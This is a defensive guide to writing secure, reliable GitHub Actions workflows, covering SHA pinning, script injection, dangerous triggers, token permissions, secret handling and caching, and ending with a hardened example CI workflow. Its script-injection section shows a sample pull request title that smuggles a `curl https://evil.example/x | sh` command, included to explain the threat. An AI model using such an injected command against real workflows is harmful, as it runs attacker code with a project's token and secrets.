# GitHub Actions Idioms and Principles

How to write GitHub Actions workflows well.
[coding-style.md](coding-style.md) covers how workflow files look. This
guide covers the traps that make a workflow unsafe, slow or misleading, how
the programming principles apply to workflows, and how to write a
workflow's spec. Every example follows the style guide.

## Principles

- **A workflow is code that holds keys.** It runs with a token that can
  write to the repository, and with the project's secrets. Give each job
  only the access it needs, and only for the steps that use it.
- **Pin everything that runs,** so a run does what the reviewed file says:
  actions by commit SHA, runner images by version, tools by lock file.
- **Untrusted input is data, never code.** Titles, branch names, commit
  messages and code from forks reach a workflow from outside. They go
  through environment variables, never into a script's text, and code from
  a fork never runs with secrets.
- **The work lives in scripts, not in YAML.** A workflow says when, where
  and with what access. `scripts/check` says what, and runs the same way on
  a laptop, where it can be tested.
- **Fail loudly.** A run that passes must mean the work passed: no ignored
  failures, no unbounded runs, no checks that can be skipped.

## The traps

Each of these looks fine and works in a quick test, and many appear in
quick-start examples.

### Actions pinned by tag or branch

`uses: actions/checkout@v7` runs whatever the `v7` tag points to today.
Anyone who can push to the action's repository can move the tag to new
code, which then runs in every workflow that uses it, with their tokens and
secrets. In March 2025, attackers moved the version tags of
`tj-actions/changed-files` to a commit that printed the runner's secrets to
the log
([CVE-2025-30066](https://github.com/advisories/GHSA-mrrh-fwg8-r2c3)). A
workflow pinned to an earlier commit SHA kept running the code it had
reviewed.

- **Pin every action and reusable workflow from another repository to a
  full commit SHA, with the version in a comment:**

  ```yaml
  - name: Check out the repository
    uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
    with:
      persist-credentials: false
  ```

- Take the SHA from the action's own repository, not from a fork:
  `git ls-remote --tags https://github.com/actions/checkout v7.0.1`. A
  commit pushed to a fork can be reached under the parent's name.
- **Let a bot update the pins in reviewed pull requests,** so security fixes
  still arrive. The [Dependabot config](.github/dependabot.yml) moves the
  SHA and the version comment together, and waits 7 days before proposing a
  release, so a compromised one is usually found and pulled first.
- Reference actions and reusable workflows in the same repository with
  `$/`, which resolves to the commit that's running. `./` reads whatever is
  on the runner's disk, which an earlier step can change.
- GitHub's workflow lockfiles, `.github/workflows/actions.lock`, pin
  every action a workflow uses, including the ones other actions call. They
  have been in public preview, for GitHub Enterprise Cloud only, since
  October 2026. Until they're generally available, pin in the workflow.
- zizmor's `unpinned-uses` audit rejects a `uses:` without a SHA. The
  Opengrep rule `github-actions-sha-without-version-comment` rejects a SHA
  without its version. Online, zizmor's `impostor-commit` audit finds a
  SHA that isn't in the named repository.

### Script injection

GitHub replaces each `${{ }}` with its value before the shell sees the
script. In `run: echo "${{ github.event.pull_request.title }}"`, a pull
request titled `"; curl https://evil.example/x | sh; "` becomes three
commands, run with the job's token and secrets. Titles, bodies, branch
names, commit messages, labels and email addresses are all set by
whoever opens the pull request or pushes the branch.

- **Pass every expression into a script through `env:`,** and use the
  variable:

  ```yaml
  - name: Check the pull request's title
    env:
      TITLE: ${{ github.event.pull_request.title }}
    run: scripts/check-title "${TITLE}"
  ```

  The shell expands `"${TITLE}"` as one word of data, whatever it contains.
- Use `"${TITLE}"`, not `${{ env.TITLE }}`, which is a template expansion
  again.
- Pass untrusted values to actions through `with:`, which hands them over
  as data.
- zizmor's `template-injection` audit and actionlint's `expression` check
  flag an untrusted context in a `run:` script. zizmor's pedantic persona
  flags every expression in one.

### Untrusted code with pull_request_target or workflow_run

`pull_request_target` and `workflow_run` run with the base repository's
secrets, a token that can write, and its cache. That's what they're for:
labelling a pull request from a fork, or commenting on it. A workflow that
then checks out the pull request's code and builds or tests it runs a
stranger's code with those secrets. A build script, a test or a
`package.json` script in the pull request is enough.

- **Build and test pull requests with `pull_request`.** For a pull request
  from a fork, it runs with no secrets and a read-only token.
- Use `pull_request_target` only for work that never runs the pull
  request's code, such as labelling, and never check the code out. Since
  version 7, `actions/checkout` refuses to check out a fork's pull request
  under these triggers unless given `allow-unsafe-pr-checkout: true`.
  Never set it.
- A `workflow_run` workflow that reads an artifact from the pull request's
  run treats it as untrusted data: it never runs it, and never expands it
  into a script.
- zizmor's `dangerous-triggers` audit flags both triggers, and
  `issue_comment`. Where one is needed, suppress the finding on the trigger
  with a comment saying why the workflow never runs untrusted code.

### Broad default token permissions

Every job gets a `GITHUB_TOKEN`. Without a `permissions` key, it has the
default permissions set for the repository, organisation or enterprise,
which can include write access to the code, packages, issues and pull
requests. Any step, and any action it calls, can use them.

- **Set `permissions: {}` at the top of every workflow,** so a job has no
  access unless it asks for it.
- **Grant each job what it uses, with a comment saying why:**

  ```yaml
  permissions:
    contents: write  # Create the release and upload its files.
  ```

- A job that checks out the repository needs `contents: read`.
- Use `id-token: write` with OpenID Connect to log in to a cloud provider,
  instead of storing a long-lived cloud key as a secret.
- A reusable workflow can lower the caller's permissions, never raise them,
  so set `permissions` on the job that calls it.
- zizmor's `excessive-permissions` audit flags a workflow without
  `permissions`, and broad grants. Its pedantic `undocumented-permissions`
  audit flags a grant without a comment.

### Secrets exposed

A secret is masked in the log only when it's printed exactly as stored. A
step that prints part of it, encodes it, or reads a field from a JSON
secret leaks it in plain text. Every step in a job with a secret in its
environment can read it, and so can every action those steps call.

- **Give a secret only to the step that uses it,** through that step's
  `env:`:

  ```yaml
  - name: Upload the release
    env:
      UPLOAD_TOKEN: ${{ secrets.UPLOAD_TOKEN }}
    run: scripts/upload dist/
  ```

- **Keep deploy secrets in an environment** with required reviewers, and
  name it in the job's `environment:`. Only that job gets them, and only
  after approval. zizmor's auditor persona flags a secret used outside one
  (`secrets-outside-env`).
- Never pass `secrets: inherit` to a reusable workflow. Name each secret it
  needs (zizmor's `secrets-inherit`). Never use `toJSON(secrets)`, which
  hands over every secret at once (`overprovisioned-secrets`).
- Store one value per secret. A JSON secret's fields aren't masked when read
  on their own (`unredacted-secrets`).
- Register a value derived from a secret with `::add-mask::` before
  printing anything that contains it.
- Pull requests from forks get no secrets, by design. Don't work around it
  with `pull_request_target` (see
  [the trap above](#untrusted-code-with-pull_request_target-or-workflow_run)).
- A leaked secret stays leaked. Rotate it, then delete the run's logs.

### Credentials persisted by checkout

`actions/checkout` saves the job's token for later `git` commands, by
default. Every later step and action can read it, and an artifact or cache
that includes the working tree can carry it out of the job.

- **Set `persist-credentials: false` on every checkout,** unless a later
  step pushes with `git`. Then set it to `true`, with a comment saying
  which step needs it.
- zizmor's `artipacked` audit flags a checkout without the setting, and
  points to any upload that could carry the token.

### Self-hosted runners on public repositories

A self-hosted runner runs whatever job reaches it, on a machine the project
owns. On a public repository, anyone can open a pull request whose workflow
runs there, then keep a process running, read other jobs' secrets, or reach
the internal network.

- **Use GitHub-hosted runners for public repositories.** Each job gets a
  fresh virtual machine that's thrown away afterwards.
- Where a self-hosted runner is unavoidable, make it ephemeral, one job
  per machine, and require approval for workflows from outside
  contributors.
- zizmor's `self-hosted-runner` audit flags every self-hosted job, under
  the auditor persona that `scripts/audit` uses. actionlint rejects a runner
  label it doesn't know, unless the [config](tools.md#actionlint) lists it.

### No timeout

A job without `timeout-minutes` runs for up to 360 minutes. A hung test or
a prompt waiting for input holds the runner for six hours, uses up paid
minutes, and delays the result.

- **Give every job a `timeout-minutes`** of about twice its usual time.
- The Opengrep rule `github-actions-job-without-timeout` catches a job
  without one.

### No concurrency group

Every push to a pull request starts a new run, and the older runs carry on
to the end, though nobody will read their result. They use up paid minutes,
and on a busy repository the run that matters waits for a free runner.

- **Give every workflow a concurrency group,** so a new run on the same
  pull request cancels the one it replaces:

  ```yaml
  concurrency:
    group: >-
      ${{ github.workflow }}-${{ github.event_name == 'pull_request'
      && github.ref || github.run_id }}
    cancel-in-progress: true
  ```

- Runs on the default branch each get a group of their own, through
  `github.run_id`, so every commit there gets a result. Never cancel a
  release or a deployment halfway: give it a fixed group with
  `cancel-in-progress: false`, so a new run waits for the one in progress
  to finish.
- zizmor's pedantic `concurrency-limits` audit flags a workflow without one.

### Cache poisoning and cache keys

A cache is restored by key, and its contents are not signed or checked. A
run that can write a cache, such as one that ran a pull request's code, can
leave a poisoned dependency or tool that a later release job restores and
ships. A key that doesn't change with the inputs restores stale
dependencies.

- **Give release and deploy jobs no cache:** `cache-mode: none`. They
  rebuild from pinned inputs, which is slower but can't be poisoned.
- Leave `cache-mode` unset elsewhere. GitHub gives low-trust triggers, such
  as `pull_request_target`, read-only access by default.
- **Key a cache on the operating system and a hash of the lock file:**

  ```yaml
  - name: Cache the pip downloads
    uses: actions/cache@55cc8345863c7cc4c66a329aec7e433d2d1c52a9  # v6.1.0
    with:
      path: ~/.cache/pip
      key: pip-${{ runner.os }}-${{ hashFiles('requirements-dev.txt') }}
  ```

- Cache downloads, not built output, and never a secret: anyone who can
  open a pull request can read the caches of the branch it targets.
- zizmor's `cache-poisoning` audit flags a cache in a workflow that
  publishes a release.

### Artifacts that leak secrets

`path: .` uploads the whole working tree, which can hold the persisted
checkout token, a `.env` file or a key a step wrote. Anyone with read
access to the repository can download an artifact.

- **Upload named files, and keep them only as long as they're needed:**

  ```yaml
  - name: Upload the test report
    if: ${{ !cancelled() }}
    uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9  # v7.0.2
    with:
      name: test-report
      path: build/test-report.xml
      if-no-files-found: error
      retention-days: 7
  ```

- `if: ${{ !cancelled() }}` uploads the report when the tests fail, which is
  when it's needed. `if-no-files-found: error` fails the step when the
  report is missing, instead of warning.
- Leave `include-hidden-files` at its default, `false`, so `.git` and
  dotfiles stay out.
- zizmor's `artipacked` audit flags an upload after a checkout that kept
  its token.

### Unpinned runner images

`runs-on: ubuntu-latest` moves to a new Ubuntu release when GitHub decides,
over a month or two, so a workflow that passed yesterday can fail on a
different compiler, Python or package set today.

- **Name the image's version:** `runs-on: ubuntu-24.04`. Move to the next
  one in a reviewed change, as with any other upgrade.
- GitHub updates the software on each image weekly, and an image can't be
  pinned further. Install the tools the build depends on at pinned versions
  instead of relying on what the image has.
- The Opengrep rule `github-actions-runner-latest` catches a `-latest`
  label.

### Copied jobs

Two workflows that each set up Python, install the tools and check out the
code drift apart: one gets the new Python version, the security setting or
the fix, and the other doesn't.

- **Move shared steps into a composite action,** as the
  [example](#a-complete-example) does with its setup steps. Use it with
  `uses: $/.github/actions/setup`.
- **Move a shared job into a reusable workflow,** called from a job:

  ```yaml
  test:
    name: Test
    uses: $/.github/workflows/test.yaml
    permissions:
      contents: read
    with:
      python-version: "3.14"
  ```

- A reusable workflow declares its inputs and secrets under
  `on.workflow_call`, sets its own `permissions` and `timeout-minutes`, and
  receives no `env` from the caller.
- jscpd finds copied blocks of 100 tokens or more across workflows (see
  [Duplication](tools.md#duplication)).

### continue-on-error

`continue-on-error: true` marks a failed step or job as a success, so the
run is green and a required check passes. It's usually added to get past a
flaky test, then forgotten, and the step's failures go unseen for months.

- **Fix or delete a step that fails for no reason.** A step that's allowed
  to fail is a step nobody reads.
- To run a step after an earlier one fails, such as uploading a test
  report, use `if: ${{ !cancelled() }}` on the later step instead.
- The Opengrep rule `github-actions-continue-on-error` catches it.

### Long inline scripts

A 40-line `run:` script can't be run, tested or debugged anywhere but in a
workflow run, and actionlint's ShellCheck pass is its only check. In a
composite action it has none: actionlint doesn't check composite steps.

- **Move any script past 10 lines into `scripts/`,** and call it from the
  step: `run: scripts/check`. The script gets the
  [Bash guide](../../languages/BASH/coding-style.md)'s formatting, linting
  and tests, and developers run the same command.
- Pass inputs as arguments or environment variables, and outputs back
  through `"${GITHUB_OUTPUT}"`.
- The Opengrep rule `github-actions-long-inline-script` catches a script of
  more than 10 lines.

### Required checks that never report

Branch protection requires checks by the job's name. If the job is renamed,
or its workflow is skipped by a path or branch filter, the check stays
"Expected" forever and nothing can merge. If the job is skipped by an
`if:`, GitHub reports it as a success, so the requirement passes without
running anything.

- Never put `paths` or `branches-ignore` filters on a workflow with a
  required check.
- Never put an `if:` on a required job. Skip inside the job's script
  instead, where the check still reports what happened.
- Rename a required job in the same change that updates branch protection.
- The [spec test](tools.md#testing) checks the required job's name.

## The principles in GitHub Actions

How the [programming principles](../../../principles.md) apply to
workflows:

- **Least authority:** `permissions: {}` at the top, and each job granted
  only the scopes it uses; secrets in the one step that uses them, and deploy
  secrets in environments; `persist-credentials: false`; OpenID Connect
  instead of long-lived cloud keys; `cache-mode: none` for releases;
  GitHub-hosted runners for public repositories.
- **Single source of truth:** each action pinned once, by SHA, and updated
  by Dependabot; shared steps in one composite action and shared jobs in one
  reusable workflow; the checks defined once in `scripts/check`, which CI
  and developers both run; the configuration variables listed in the
  actionlint config.
- **Immutability:** SHA pins instead of moving tags, a named runner image,
  `$/` for the repository's own actions, and a release built from a clean
  checkout with no cache.
- **Fail fast:** `shell: bash` for `pipefail`, a `timeout-minutes` on every
  job, no `continue-on-error`, and `if-no-files-found: error`.
- **Separation of concerns:** the workflow decides when, where and with
  what access, and scripts do the work; untrusted pull requests are built by
  `pull_request`, and privileged work happens in separate jobs and workflows.
- **KISS and YAGNI:** one workflow per purpose, few jobs, no matrix until
  the code must run on several platforms, and no composite action until two
  jobs share the steps.

## Writing the spec

A spec states what the workflow must do in terms a check can prove. "Runs
CI safely" can't be checked; "runs on pull requests to main, with a
read-only token, and finishes within 15 minutes" can. For the example
workflow:

| Requirement | Checked by |
| --- | --- |
| Runs on pull requests to main, pushes to main, Mondays at 06:00 UTC, and on demand | Spec test |
| The token has no permissions at the top, and each job has only `contents: read` | Spec test, zizmor `excessive-permissions` |
| The required check is named `Check`, and the check job always runs | Spec test, real run on a branch |
| The check job is cancelled after 15 minutes, and every job after 30 at most | Spec test, Opengrep |
| A new push to a pull request cancels the run it replaces | Spec test, zizmor `concurrency-limits` |
| Every action is pinned to a commit SHA, with its version | zizmor `unpinned-uses`, Opengrep |
| No step keeps the checkout token, and no secret reaches a pull request's code | zizmor `artipacked`, `dangerous-triggers` |
| No untrusted value is expanded into a script | zizmor `template-injection`, actionlint |
| A failing check fails the run, and a passing one passes it | Real run on a branch |
| The audit runs on main, weekly and on demand, never on a pull request | Real run, or a manual run on a branch |

Write the checks before the workflow, as [tools.md](tools.md#testing)
describes, so each requirement fails first and passes once the workflow
meets it.

## Spikes

A spike tries a workflow change on a branch of a fork, or of a scratch
repository, never on the project's default branch. A push to the branch
runs the changed workflow, and so does a pull request from it to the
fork's own default branch.

- **A spike never uses production secrets or environments.** Use a test
  secret with no real access, or none, and a scratch repository's own
  environments.
- Never point a spike's deploy step at real infrastructure, a real package
  registry or a real release.
- Delete the branch and its runs afterwards, so no log of the experiment
  lingers.

## A complete example

The CI workflow of a Python project. `scripts/check` runs the linters and
tests, and `scripts/audit` runs the slow checks that need the network, as
the [tools guides](tools.md#scriptscheck-and-scriptsaudit) describe. The
workflow, `.github/workflows/ci.yaml`:

```yaml
---
# CI: checks every pull request to main and every push to main, and audits
# the project after each merge, weekly and on demand. scripts/check and
# scripts/audit do the work, and run the same way on a laptop; this file
# only says when they run, where, and with what access.
name: CI

"on":
  pull_request:
    branches:
      - main
  push:
    branches:
      - main
  schedule:
    # Mondays at 06:00 UTC, so a new advisory is found within a week.
    - cron: 0 6 * * 1
  workflow_dispatch: {}

# No token permissions unless a job asks for them.
permissions: {}

# Runs for the same pull request share a group, so a new push cancels the
# run it replaces. Every other run is a group of its own, so no run on main
# is ever cancelled.
concurrency:
  group: >-
    ${{ github.workflow }}-${{ github.event_name == 'pull_request'
    && github.ref || github.run_id }}
  cancel-in-progress: true

defaults:
  run:
    # A named bash adds -o pipefail, which the unnamed default leaves out.
    shell: bash

jobs:
  check:
    name: Check
    runs-on: ubuntu-24.04
    permissions:
      contents: read
    timeout-minutes: 15
    steps:
      - name: Set up the job
        uses: $/.github/actions/setup
      - name: Run the checks
        run: scripts/check

  # The audit is slow and needs the network, so pull requests skip it. It
  # runs after every merge, weekly and on demand.
  audit:
    name: Audit
    if: github.event_name != 'pull_request'
    runs-on: ubuntu-24.04
    permissions:
      contents: read
    timeout-minutes: 30
    steps:
      - name: Set up the job
        uses: $/.github/actions/setup
        with:
          # gitleaks scans every commit, so fetch the whole history.
          fetch-depth: 0
      - name: Run the audit
        env:
          # zizmor's online audits read the actions' repositories through
          # the GitHub API, which rate-limits requests without a token.
          GH_TOKEN: ${{ github.token }}
        run: scripts/audit
```

The composite action both jobs use, `.github/actions/setup/action.yaml`:

```yaml
---
# Sets up a CI job: checks out the repository without keeping the token,
# then installs the pinned development tools. Every job uses it, so the
# Python version and the tools can't drift between jobs.
name: Set up
description: Check out the repository and install the development tools.

inputs:
  fetch-depth:
    description: Number of commits to fetch. 0 fetches the whole history.
    required: false
    default: "1"

runs:
  using: composite
  steps:
    - name: Check out the repository
      uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
      with:
        fetch-depth: ${{ inputs.fetch-depth }}
        persist-credentials: false
    - name: Set up Python
      uses: actions/setup-python@6d4fd22b20465ccc0f7354476588e8df7c9ca0e0  # v7.1.0
      with:
        python-version-file: .python-version
        cache: pip
        cache-dependency-path: requirements-dev.txt
    - name: Install the development tools
      shell: bash
      run: python -m pip install --require-hashes -r requirements-dev.txt
```

- `permissions: {}` and `contents: read` give each job a token that can
  only read. The audit job's `GH_TOKEN` is that same token, in the one step
  that uses it.
- The check job has no `if:`, so its required check always reports. The
  audit job isn't required, so skipping it on pull requests can't hide
  anything.
- `$/` loads the composite action from the commit that's running, before
  anything is checked out, so the action itself does the checkout.
- `--require-hashes` makes pip refuse any package whose hash isn't in the
  lock file, so the installed tools are exactly the reviewed ones.
- The pip cache is keyed by `setup-python` on the runner's OS, the Python
  version and the lock file's hash. Nothing here publishes a release, so
  there's nothing for a poisoned cache to reach.

## Sources

- [Secure use reference](https://docs.github.com/en/actions/reference/security/secure-use)
- [Script injections](https://docs.github.com/en/actions/concepts/security/script-injections)
- [Workflow syntax](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax)
- [Events that trigger workflows](https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows)
- [Dependency caching reference](https://docs.github.com/en/actions/reference/workflows-and-actions/dependency-caching)
- [Control workflow concurrency](https://docs.github.com/en/actions/how-tos/write-workflows/choose-when-workflows-run/control-workflow-concurrency)
- [Reuse workflows](https://docs.github.com/en/actions/how-tos/reuse-automations/reuse-workflows)
- [Workflow dependency lockfiles](https://docs.github.com/en/actions/concepts/security/workflow-dependency-lockfiles)
- [Troubleshooting required status checks](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/collaborating-on-repositories-with-code-quality-features/troubleshooting-required-status-checks)
- [Runner images](https://github.com/actions/runner-images)
- [actions/checkout](https://github.com/actions/checkout)
- [Dependabot options reference](https://docs.github.com/en/code-security/reference/supply-chain-security/dependabot-options-reference)
- [zizmor audits](https://docs.zizmor.sh/audits/)
- [GHSA-mrrh-fwg8-r2c3: tj-actions/changed-files](https://github.com/advisories/GHSA-mrrh-fwg8-r2c3)
